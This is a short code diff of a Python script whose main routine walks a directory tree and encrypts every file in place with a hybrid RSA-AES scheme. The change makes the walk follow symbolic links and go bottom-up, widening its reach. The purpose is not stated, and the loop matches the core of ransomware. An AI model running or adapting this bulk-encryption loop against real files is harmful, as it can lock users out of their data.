@@ -20,7 +20,7 @@ def main(rootdir):
     clean(rootdir)
     start = time.time()
     rsa_aes = encrypt.RSAAESEncryption()
-    for subdir, _, files in os.walk(rootdir):
+    for subdir, _, files in os.walk(rootdir, topdown=False, followlinks=True):
         for file in files:
             fpath = os.path.abspath(os.path.join(subdir, file))
             rsa_aes.encrypt(fpath)
